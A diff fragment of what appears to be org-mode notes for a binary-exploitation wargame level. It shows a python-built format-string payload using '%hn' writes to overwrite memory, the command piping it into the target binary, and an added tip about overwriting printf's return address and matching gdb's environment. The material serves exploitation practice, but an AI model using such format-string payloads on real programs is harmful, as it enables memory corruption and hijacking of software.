@@ -163,6 +163,9 @@ va_o_diff = 31904
 #+begin_src shell
 python -c 'print "\x08\x04\x98\x3c"[::-1] + "\x08\x04\x98\x38"[::-1] + "%2044d%4$hn%31904d%5$hn"' > /tmp/$USER
 #+end_src
+**** Alternative
+We can change the printf return va for m va.
+Need to delete the gdb vars ~LINE~ and ~COLUMNS~ for get the real va outside gdb.
 * Explotation
 #+begin_src shell
 cat /tmp/$USER - | ./$USER
